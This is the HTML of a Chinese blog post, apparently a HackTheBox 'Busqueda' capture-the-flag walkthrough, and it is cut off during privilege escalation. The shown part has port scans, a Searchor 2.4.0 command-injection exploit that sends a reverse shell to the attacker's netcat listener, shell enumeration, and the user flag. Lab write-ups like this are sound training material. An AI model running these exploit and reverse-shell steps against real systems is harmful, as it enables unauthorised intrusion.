@@ -1,0 +1,796 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：Searchor_2.4.0_RCE、flask配置文件泄露、.git配置文件泄露、密码复用、sudo利用、python脚本分析、docker-inspect命令使用、docker容器配置文件查看、MySQL容器地址查看、MySQL查看用户密码、.git网站Python脚本分析、相对路径脚本提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Busqueda-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/04/19/Busqueda-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：Searchor_2.4.0_RCE、flask配置文件泄露、.git配置文件泄露、密码复用、sudo利用、python脚本分析、docker-inspect命令使用、docker容器配置文件查看、MySQL容器地址查看、MySQL查看用户密码、.git网站Python脚本分析、相对路径脚本提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Busqueda-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Busqueda-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Busqueda-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Busqueda-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Busqueda-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Busqueda-htb-writeup/6.png">
+<meta property="article:published_time" content="2024-04-19T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-05-05T15:13:19.638Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Busqueda-htb-writeup/1.png">
+  
+  
+  
+  <title>Busqueda-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Busqueda-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-04-19 23:50" pubdate>
+          2024年4月19日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          22k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          187 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Busqueda-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：Searchor_2.4.0_RCE、flask配置文件泄露、.git配置文件泄露、密码复用、sudo利用、python脚本分析、docker-inspect命令使用、docker容器配置文件查看、MySQL容器地址查看、MySQL查看用户密码、.git网站Python脚本分析、相对路径脚本提权</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://0xdf.gitlab.io/2023/08/12/htb-busqueda.html</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.11.208</p>
+<p>2、扫描下开放端口情况</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.208</span> -oG allports -Pn<br>[sudo] kali 的密码：<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-04-19 06:25 CST</span><br>RTTVAR has grown to over <span class="hljs-number">2.3</span> seconds, decreasing to <span class="hljs-number">2.0</span><br>RTTVAR has grown to over <span class="hljs-number">2.3</span> seconds, decreasing to <span class="hljs-number">2.0</span><br>Warning: <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.208</span> giving up on port because retransmission cap hit (<span class="hljs-number">10</span>).<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.208</span><br>Host is up (<span class="hljs-number">3.8</span>s latency).<br>Not shown: <span class="hljs-number">46786</span> filtered tcp ports (no-response), <span class="hljs-number">18747</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp open  ssh<br><span class="hljs-number">80</span>/tcp open  http<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">81.94</span> seconds<br>                                                                                                                                                           <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p22,<span class="hljs-number">80</span> -sC -sV --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.208</span>                                      <br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-04-19 06:28 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.208</span><br>Host is up (<span class="hljs-number">0.15</span>s latency).<br><br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8.9</span>p1 Ubuntu <span class="hljs-number">3u</span>buntu0<span class="hljs-number">.1</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| ssh-hostkey: <br>|   <span class="hljs-number">256</span> <span class="hljs-number">4f</span>:e3:a6:<span class="hljs-number">67</span>:a2:<span class="hljs-number">27</span>:f9:<span class="hljs-number">11</span>:<span class="hljs-number">8</span>d:c3:<span class="hljs-number">0</span>e:d7:<span class="hljs-number">73</span>:a0:<span class="hljs-number">2</span>c:<span class="hljs-number">28</span> (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">81</span>:<span class="hljs-number">6</span>e:<span class="hljs-number">78</span>:<span class="hljs-number">76</span>:<span class="hljs-number">6b</span>:<span class="hljs-number">8</span>a:ea:<span class="hljs-number">7</span>d:<span class="hljs-number">1b</span>:ab:d4:<span class="hljs-number">36</span>:b7:f8:ec:c4 (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.52</span><br>|_http-title: Did not follow redirect to http:<span class="hljs-comment">//searcher.htb/</span><br>|_http-server-header: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.52</span> (Ubuntu)<br>Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">16.52</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、绑定下本地hosts域名</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop/tools/htb-portscan]<br>└─$ echo <span class="hljs-string">&quot;10.10.11.208 searcher.htb&quot;</span> | sudo tee -a /etc/hosts<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.208</span> searcher.htb<br></code></pre></td></tr></table></figure>
+
+<p>4、查看下域名信息</p>
+<p><code>http://searcher.htb/</code></p>
+<p><img src="http://sh1yan.top/photo/Busqueda-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Busqueda-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">Powered by Flask and Searchor <span class="hljs-number">2.4</span><span class="hljs-number">.0</span><br>由Flask和Searchor提供技术支持<span class="hljs-number">2.4</span><span class="hljs-number">.0</span> <br></code></pre></td></tr></table></figure>
+
+<p>5、谷歌下这个框架的漏洞</p>
+<p><code>searchor 2.4.0 exploit</code></p>
+<p><img src="http://sh1yan.top/photo/Busqueda-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection</code></p>
+<p><code>https://github.com/twisted007/Searchor_2.4.0_RCE_Python</code></p>
+<p>6、对发现的exp进行尝试利用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ chmod +x ./exploit.sh <br>                                                                                                                                                           <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ./exploit.sh searcher.htb <span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.2</span>               <br>---[Reverse Shell Exploit <span class="hljs-keyword">for</span> Searchor &lt;= <span class="hljs-number">2.4</span><span class="hljs-number">.2</span> (<span class="hljs-number">2.4</span><span class="hljs-number">.0</span>)]---<br>[*] Input target is searcher.htb<br>[*] Input attacker is <span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.2</span>:<span class="hljs-number">443</span><br>[*] Run the Reverse Shell... Press Ctrl+C after successful connection<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ rlwrap nc -lnvp <span class="hljs-number">443</span><br>listening on [any] <span class="hljs-number">443</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.2</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.208</span>] <span class="hljs-number">36680</span><br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (<span class="hljs-number">1645</span>): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control in this shell<br>svc@busqueda:/var/www/app$ id<br>id<br>uid=<span class="hljs-number">1000</span>(svc) gid=<span class="hljs-number">1000</span>(svc) groups=<span class="hljs-number">1000</span>(svc)<br>svc@busqueda:/var/www/app$<br></code></pre></td></tr></table></figure>
+
+<p>7、成功的获取到了初始shell环境，那继续枚举吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">svc@busqueda:/var/www/app$ ls -la /home/<br>ls -la /home/<br>total <span class="hljs-number">12</span><br>drwxr-xr-x  <span class="hljs-number">3</span> root root <span class="hljs-number">4096</span> Dec <span class="hljs-number">22</span>  <span class="hljs-number">2022</span> .<br>drwxr-xr-x <span class="hljs-number">19</span> root root <span class="hljs-number">4096</span> Mar  <span class="hljs-number">1</span>  <span class="hljs-number">2023</span> ..<br>drwxr-x---  <span class="hljs-number">4</span> svc  svc  <span class="hljs-number">4096</span> Apr  <span class="hljs-number">3</span>  <span class="hljs-number">2023</span> svc<br>svc@busqueda:/var/www/app$ ls -la /home/svc<br>ls -la /home/svc<br>total <span class="hljs-number">36</span><br>drwxr-x--- <span class="hljs-number">4</span> svc  svc  <span class="hljs-number">4096</span> Apr  <span class="hljs-number">3</span>  <span class="hljs-number">2023</span> .<br>drwxr-xr-x <span class="hljs-number">3</span> root root <span class="hljs-number">4096</span> Dec <span class="hljs-number">22</span>  <span class="hljs-number">2022</span> ..<br>lrwxrwxrwx <span class="hljs-number">1</span> root root    <span class="hljs-number">9</span> Feb <span class="hljs-number">20</span>  <span class="hljs-number">2023</span> .bash_history -&gt; /dev/null<br>-rw-r--r-- <span class="hljs-number">1</span> svc  svc   <span class="hljs-number">220</span> Jan  <span class="hljs-number">6</span>  <span class="hljs-number">2022</span> .bash_logout<br>-rw-r--r-- <span class="hljs-number">1</span> svc  svc  <span class="hljs-number">3771</span> Jan  <span class="hljs-number">6</span>  <span class="hljs-number">2022</span> .bashrc<br>drwx------ <span class="hljs-number">2</span> svc  svc  <span class="hljs-number">4096</span> Feb <span class="hljs-number">28</span>  <span class="hljs-number">2023</span> .cache<br>-rw-rw-r-- <span class="hljs-number">1</span> svc  svc    <span class="hljs-number">76</span> Apr  <span class="hljs-number">3</span>  <span class="hljs-number">2023</span> .gitconfig<br>drwxrwxr-x <span class="hljs-number">5</span> svc  svc  <span class="hljs-number">4096</span> Jun <span class="hljs-number">15</span>  <span class="hljs-number">2022</span> .local<br>lrwxrwxrwx <span class="hljs-number">1</span> root root    <span class="hljs-number">9</span> Apr  <span class="hljs-number">3</span>  <span class="hljs-number">2023</span> .mysql_history -&gt; /dev/null<br>-rw-r--r-- <span class="hljs-number">1</span> svc  svc   <span class="hljs-number">807</span> Jan  <span class="hljs-number">6</span>  <span class="hljs-number">2022</span> .profile<br>lrwxrwxrwx <span class="hljs-number">1</span> root root    <span class="hljs-number">9</span> Feb <span class="hljs-number">20</span>  <span class="hljs-number">2023</span> .searchor-history.json -&gt; /dev/null<br>-rw-r----- <span class="hljs-number">1</span> root svc    <span class="hljs-number">33</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> user.txt<br>svc@busqueda:/var/www/app$<br></code></pre></td></tr></table></figure>
+
+<p>8、看来是有权限读取flag信息的，那就获取下吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">svc@busqueda:/var/www/app$ cat /home/svc/user.txt<br>cat /home/svc/user.txt<br><span class="hljs-number">02054f</span>5edd3fc6830bdd154e836fbafa<br>svc@busqueda:/var/www/app$ <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>9、尝试枚举可以提权的信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><code class="hljs c">svc@busqueda:/var/www/app$ sudo -l<br>sudo -l<br>sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper<br>sudo: a password is required<br>svc@busqueda:/var/www/app$ python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>Command <span class="hljs-string">&#x27;python&#x27;</span> not found, did you mean:<br>  command <span class="hljs-string">&#x27;python3&#x27;</span> from deb python3<br>  command <span class="hljs-string">&#x27;python&#x27;</span> from deb python-is-python3<br>svc@busqueda:/var/www/app$ <br><br>svc@busqueda:/var/www/app$ <br><br>svc@busqueda:/var/www/app$ id<br>id<br>uid=<span class="hljs-number">1000</span>(svc) gid=<span class="hljs-number">1000</span>(svc) groups=<span class="hljs-number">1000</span>(svc)<br>svc@busqueda:/var/www/app$ find / -type f -group svc <span class="hljs-number">2</span>&gt;/dev/null | grep -v /sys | grep -v /proc<br>&lt;roup svc <span class="hljs-number">2</span>&gt;/dev/null | grep -v /sys | grep -v /proc<br>/home/svc/.gitconfig<br>/home/svc/.bashrc<br>/home/svc/.cache/motd.legal-displayed<br>/home/svc/user.txt<br>/home/svc/.bash_logout<br> .....<br>/home/svc/.local/bin/flask<br>/home/svc/.local/bin/pyjwt<br>/home/svc/.profile<br><br>svc@busqueda:/var/www/app$ ls -la<br>ls -la<br>total <span class="hljs-number">20</span><br>drwxr-xr-x <span class="hljs-number">4</span> www-data www-data <span class="hljs-number">4096</span> Apr  <span class="hljs-number">3</span>  <span class="hljs-number">2023</span> .<br>drwxr-xr-x <span class="hljs-number">4</span> root     root     <span class="hljs-number">4096</span> Apr  <span class="hljs-number">4</span>  <span class="hljs-number">2023</span> ..<br>-rw-r--r-- <span class="hljs-number">1</span> www-data www-data <span class="hljs-number">1124</span> Dec  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> app.py<br>drwxr-xr-x <span class="hljs-number">8</span> www-data www-data <span class="hljs-number">4096</span> Apr <span class="hljs-number">18</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span> .git<br>drwxr-xr-x <span class="hljs-number">2</span> www-data www-data <span class="hljs-number">4096</span> Dec  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> templates<br>svc@busqueda:/var/www/app$ cat app.py<br>cat app.py<br>from flask import Flask, render_template, request, redirect<br>from searchor import Engine<br>import subprocess<br><br><br>app = Flask(__name__)<br><br>@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)<br>def index():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, options=Engine.__members__, error=<span 